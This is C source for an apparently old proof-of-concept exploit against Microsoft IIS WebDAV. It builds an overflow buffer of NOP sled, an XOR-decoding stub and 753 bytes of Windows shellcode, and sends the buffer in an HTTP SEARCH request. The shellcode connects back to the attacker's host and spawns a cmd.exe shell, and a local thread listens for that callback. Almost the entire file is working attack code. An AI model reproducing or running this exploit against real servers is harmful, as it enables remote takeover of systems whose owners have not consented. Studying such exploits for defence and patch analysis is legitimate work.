/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*      29/05/2003 - The Matrix Reloaded -        */
/*      Proof of concept exploit by Alumni        */
/*-\--/--\--/--\--/--\--/--\--/--\--/--\--/--\--/-*/
/* In brief:                                      */
/* 1) spawns shell on port 32768;                 */
/* 2) the byte-code independent on                */
/*        kernel loading point entry;             */
/* 3) because of zero-bytes presence in           */
/*        code, the shellcode is xored with       */
/*        calculate-based selective key;          */
/*-\--/--\--/--\--/--\--/--\--/--\--/--\--/--\--/-*/
/* Greetings: to all my friends                   */
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/


#include <stdio.h>
#include <winsock.h>
#include <windows.h>

#define SHELLCODELEN    753
#define NOP                             0x90
#define BUFFERLEN               1024
#define RET                             0x41424344

#define GMHOFF  30
#define GPAOFF  38
#define IPOFF   161
#define DEFPORT 32768


//#define DEBUGGEE_FLOW // for debug only
#ifdef DEBUGGEE_FLOW
#define GMH             (long)GetModuleHandle
#define GPA             (long)GetProcAddress
#else
#define GMH             0x0100107C      // GetModuleHandle@
#define GPA             0x01001034      // GetProcAddress@
#endif


#define XOROFF  11
#define SOFF    16


char prologue[] =
"\xEB\x03"      // jmp $+3
"\x58"          // pop eax
"\x50"          // push eax
"\xC3"          // retn
"\xE8\xF8\xFF\xFF\xFF"  // call $-3
"\xB2"          // mov dl, %key

"\x90"          // %key
"\x33\xC9"      // xor ecx, ecx
"\x66\xB9"      // mov cx, shellcodesize

"\x04\x03"      // shellcodesize = hex(SHELLCODELEN)
"\x04\x14"      // add al, 0x14
"\x30\x10"      // xor byte ptr[eax], dl
"\x40"          // inc eax
"\x66\x49"      // dec cx
"\x67\xE3\x02"  // jcxz $+5
"\xEB\xF6"      // jmp $-8
;


char shellcode[SHELLCODELEN+1] =
"\xe8\x5f\x02\x00\x00\x8b\xe8\x33\xf6\x66\xbe\x80"
"\x00\x03\xf4\xc7\x46\xf0\x00\x00\x00\x00\xc7\x46"
"\xf4\x00\x00\x00\x00\xb8\xf2\x12\x40\x00\x89\x46"
"\xf8\xb8\xf8\x12\x40\x00\x89\x46\xfc\x8b\xd5\x81"
"\xc2\x9e\x02\x00\x00\x52\xff\x56\xf8\x89\x46\xf4"
"\x8b\xd5\x81\xc2\xab\x02\x00\x00\x52\xff\x76\xf4"
"\xff\x56\xfc\x68\x00\x10\x00\x00\x6a\x40\xff\xd0"
"\x8b\xf8\x8b\xc7\x8b\xfe\x8b\xf0\x83\xc6\x20\x8b"
"\x47\xf8\x89\x46\xf8\x8b\x47\xf4\x89\x46\xf4\x8b"
"\x47\xfc\x89\x46\xfc\x8b\xd5\x81\xc2\x6e\x02\x00"
"\x00\x52\xff\x56\xf8\x89\x46\xf0\x8b\xd5\x81\xc2"
"\x7e\x02\x00\x00\x52\xff\x76\xf0\xff\x56\xfc\x8b"
"\xd8\x6a\x06\x6a\x01\x6a\x02\xff\xd3\x89\x06\x8b"
"\xd6\x83\xc2\x14\xb8"
"\x7f\x00\x00\x01"              // put your ip here (run netcat before,
e.g. 127.0.0.1)
"\x89\x42\x04\x66\xc7\x02\x02\x00\x66\xb8"
"\x80\x00"                      // specify connectious port here (e.g.
32768)
"\x66\x89\x42"
"\x02\x8b\xd5\x81\xc2\x8a\x02\x00\x00\x52\xff\x76"
"\xf0\xff\x56\xfc\x8b\xd8\x6a\x10\x8b\xd6\x83\xc2"
"\x14\x52\xff\x36\xff\xd3\x83\xf8\xff\x0f\x84\x84"
"\x01\x00\x00\x8b\xd5\x81\xc2\x79\x02\x00\x00\x52"
"\xff\x76\xf0\xff\x56\xfc\x8b\xd8\x8b\xd6\x6a\x00"
"\x68\x64\x0f\x00\x00\x81\xc2\x9c\x00\x00\x00\x52"
"\xff\x36\xff\xd3\xc6\x84\x30\x9c\x00\x00\x00\x00"
"\xbb\x00\x00\x00\x00\x66\xb9\x0c\x00\x8a\x84\x2b"
"\x62\x02\x00\x00\x88\x84\x33\x90\x00\x00\x00\x43"
"\x66\x49\x66\x83\xf9\x00\x75\xe9\x8b\xfe\x81\xc7"
"\x84\x00\x00\x00\xc7\x07\x0c\x00\x00\x00\xc7\x47"
"\x04\x00\x00\x00\x00\xc7\x47\x08\x01\x00\x00\x00"
"\x8b\xfe\x8b\xd6\x8b\xce\x81\xc7\x84\x00\x00\x00"
"\x83\xc2\x0c\x83\xc1\x10\x6a\x00\x57\x51\x52\x8b"
"\xd5\x81\xc2\xc9\x02\x00\x00\x52\xff\x76\xf4\xff"
"\x56\xfc\x8b\xd8\xff\xd3\x8b\xfe\x83\xc7\x34\xc7"
"\x07\x44\x00\x00\x00\x66\xc7\x47\x30\x00\x00\xc7"
"\x47\x2c\x01\x01\x00\x00\x8b\x46\x10\x89\x47\x3c"
"\x89\x47\x40\x8b\xd6\x8b\xde\x8b\xce\x81\xc2\x90"
"\x00\x00\x00\x83\xc3\x34\x83\xc1\x78\x51\x53\x6a"
"\x00\x6a\x00\x6a\x00\x6a\x01\x6a\x00\x6a\x00\x52"
"\x6a\x00\x8b\xd5\x81\xc2\xd4\x02\x00\x00\x52\xff"
"\x76\xf4\xff\x56\xfc\x8b\xd8\xff\xd3\x8b\xd5\x81"
"\xc2\xbd\x02\x00\x00\x52\xff\x76\xf4\xff\x56\xfc"
"\x8b\xd8\xff\x76\x10\xff\xd3\x8b\xd6\x83\xc2\x08"
"\x8b\xd5\x81\xc2\xb7\x02\x00\x00\x52\xff\x76\xf4"
"\xff\x56\xfc\x8b\xd8\x68\x88\x13\x00\x00\xff\xd3"
"\x8b\xd6\x8b\xce\x81\xc2\x90\x00\x00\x00\x83\xc1"
"\x08\x8b\x5e\x08\x6a\x00\x51\x68\x70\x0f\x00\x00"
"\x52\xff\x76\x0c\x8b\xd5\x81\xc2\xe3\x02\x00\x00"
"\x52\xff\x76\xf4\xff\x56\xfc\x8b\xd8\xff\xd3\x8b"
"\xd6\x81\xc2\x90\x00\x00\x00\x6a\x00\xff\x76\x08"
"\x52\xff\x36\x8b\xd5\x81\xc2\x85\x02\x00\x00\x52"
"\xff\x76\xf0\xff\x56\xfc\x8b\xd8\xff\xd3\x8b\xd5"
"\x81\xc2\x92\x02\x00\x00\x52\xff\x76\xf0\xff\x56"
"\xfc\x8b\xd8\xff\x36\xff\xd3\xe9\x1c\xfe\xff\xff"
"\x58\x50\xc3\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f"
"\x43\x20\x20\x57\x53\x32\x5f\x33\x32\x2e\x44\x4c"
"\x4c\x00\x72\x65\x63\x76\x00\x73\x6f\x63\x6b\x65"
"\x74\x00\x73\x65\x6e\x64\x00\x63\x6f\x6e\x6e\x65"
"\x63\x74\x00\x63\x6c\x6f\x73\x65\x73\x6f\x63\x6b"
"\x65\x74\x00\x4b\x45\x52\x4e\x45\x4c\x33\x32\x2e"
"\x44\x4c\x4c\x00\x47\x6c\x6f\x62\x61\x6c\x41\x6c"
"\x6c\x6f\x63\x00\x53\x6c\x65\x65\x70\x00\x43\x6c"
"\x6f\x73\x65\x48\x61\x6e\x64\x6c\x65\x00\x43\x72"
"\x65\x61\x74\x65\x50\x69\x70\x65\x00\x43\x72\x65"
"\x61\x74\x65\x50\x72\x6f\x63\x65\x73\x73\x41\x00"
"\x52\x65\x61\x64\x46\x69\x6c\x65\x00";


char xmlbody[] ="<?xml version=\"1.0\"?>\r\n<g:searchrequest
xmlns:g=\"DAV:\">\r\n"
                                "<g:sql>\r\nSelect \"DAV:displayname\"
from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n";


long retaddr, buffsize;
char* buffer;



unsigned long getlocalhostip()
{
        char buff[128];
        in_addr inaddr;
        if(!gethostname(buff,128))
        {
                memcpy(&inaddr,gethostbyname(buff)->h_addr,4);
                return(inet_addr(inet_ntoa(inaddr)));
        }
        return (-1);
}



ULONG WINAPI AcceptThread(LPVOID lpParam)
{
        int ln1;
        unsigned long slisten, sacc;
        sockaddr_in saddrin;

        slisten = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
        if (slisten!=INVALID_SOCKET)
        {
                saddrin.sin_addr.s_addr = INADDR_ANY;
                saddrin.sin_family = AF_INET;
                saddrin.sin_port = htons(DEFPORT);
                bind(slisten,(struct sockaddr*)&saddrin,sizeof(saddrin));
                listen(slisten,5);
                while (1)
                {
                        ln1 = sizeof(saddrin);
                        sacc = accept(slisten,(struct sockaddr*)
&saddrin,&ln1);
                        if (sacc!=INVALID_SOCKET)
                        {
                                printf("\n\nShell succesfully spawned on
remote host\nNetcat to %d",DEFPORT);
                                ExitProcess(0);
                        }
                }
        }
        return (1);
}


ULONG SendRequest (char* sHost, int iPort)
{
        char* buffsend;
        struct sockaddr_in saddr_in;
        int timeout;
        unsigned long sock;

        buffsend = (char*)malloc(buffsize+256);
        memset(buffsend,0,buffsize+256);
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        saddr_in.sin_addr.s_addr = inet_addr(sHost);
        saddr_in.sin_family = AF_INET;
        saddr_in.sin_port = htons(iPort);
        if (!connect(sock,(struct sockaddr*)&saddr_in,sizeof(saddr_in)))
        {
                timeout = 5000;
                setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,(char*)
&timeout,sizeof(timeout));
                setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)
&timeout,sizeof(timeout));
                sprintf(buffsend,"SEARCH / HTTP/1.1\r\nHost:%s\r\nContent-
Type: text/xml\r\nContent-Length: %d\r\n\r\n%s%s",strlen(xmlbody)+strlen
(buffer),xmlbody,buffer);
                send (sock,buffsend,strlen(buffsend),0);
                closesocket(sock);
        }
        else return(1);

        return (0);
}


void dispUsage(char* str1)
{
        printf ("IIS WebDAV exploit by Alumni - The Matrix Reloaded -\n");
        printf ("Usage: %s <ipv4dot> <port> [<buffsize>] [<retaddr>]
\n\n",str1);
        return;
}

int main(int argc, char** argv)
{
        unsigned long uThread;
        int prologuelen = 0, i;
        char xorkey = 0;
        long *ptr1;
        WSADATA wsadata;

        WSAStartup(MAKEWORD(2,0),&wsadata);
        buffsize = BUFFERLEN;
        retaddr = RET;

#ifndef DEBUGGEE_FLOW
        if (argc<3)
        {
                dispUsage(argv[0]);
                return (1);
        }
        if (argc>=4) buffsize = atoi(argv[3]);
        if (argc>=5) retaddr = atol(argv[4]);
#endif

        buffer = (char*) malloc(buffsize+1);
        ptr1 = (long*)buffer;
        memset(buffer,0,buffsize);
        CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)
AcceptThread,NULL,NULL,&uThread);

        *(long*)(shellcode+GMHOFF) = GMH;
        *(long*)(shellcode+GPAOFF) = GPA;
        *(long*)(shellcode+IPOFF) = getlocalhostip();

        for (i=0;i<256;i++)
        {
                int iBool = 1, j;
                for (j=0;j<SHELLCODELEN;j++)
                        if ((shellcode[j]^i)==0 || (shellcode[j]^i)==0x0d
|| (shellcode[j]^i)==0x0a) iBool = 0;
                if (iBool)
                {
                        xorkey = i;
                        break;
                }
        }

        for (i=0;i<SHELLCODELEN;i++) shellcode[i] ^= xorkey;
        for (i=0;i<(buffsize-SHELLCODELEN)/2;i++) buffer[i] = NOP;
        prologue[XOROFF] = xorkey;
        *(short int*)(prologue+SOFF) = SHELLCODELEN;

        strncat(buffer,prologue,buffsize);

        prologuelen = strlen(buffer);
        for (i=prologuelen;i<SHELLCODELEN+prologuelen;i++) buffer[i] =
shellcode[i-prologuelen];
        prologuelen = strlen(buffer);
        buffer[prologuelen] = NOP;
        buffer[prologuelen+1] = NOP;
        buffer[prologuelen+2] = NOP;
        buffer[prologuelen+3] = NOP;
        for (i=(prologuelen+3) & (~3);i<buffsize;i+=sizeof(retaddr))  *
(long*)(buffer+i) = retaddr;
        buffer[buffsize] = 0;

        printf ("%s",buffer);


#ifdef DEBUGGEE_FLOW
        __asm {
                mov eax, ptr1
                call eax
        }
#else
        SendRequest(argv[1],atoi(argv[2]));
#endif

        WSACleanup();
        return (0);
}

